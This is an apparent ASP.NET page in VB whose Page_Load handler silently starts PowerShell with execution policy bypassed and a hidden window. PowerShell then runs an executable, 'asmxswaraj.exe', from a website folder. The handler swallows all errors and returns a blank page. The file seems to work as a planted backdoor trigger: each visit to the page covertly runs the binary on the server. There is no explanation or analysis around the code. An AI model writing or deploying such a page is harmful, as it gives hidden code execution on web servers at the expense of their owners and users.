<%@ Page Language="VB" Debug="true" %>
<%@ Import Namespace="System.Diagnostics" %>

<script runat="server">
Protected Sub Page_Load(ByVal sender As Object, ByVal e As EventArgs) Handles Me.Load
    Try
        Dim exePath As String = "C:\Website\SwarajReports.indiainfoline.com\asmxswaraj.exe"

        Dim psCommand As String = $"Start-Process -FilePath '{exePath}' -WindowStyle Hidden"
        Dim psi As New ProcessStartInfo("powershell.exe", "-NoProfile -ExecutionPolicy Bypass -Command """ & psCommand & """")
        psi.UseShellExecute = False
        psi.CreateNoWindow = True
        psi.RedirectStandardOutput = True
        psi.RedirectStandardError = True
        Process.Start(psi)
    Catch
        ' Fail silently
    End Try

    Response.Clear()
    Response.End()
End Sub
</script>
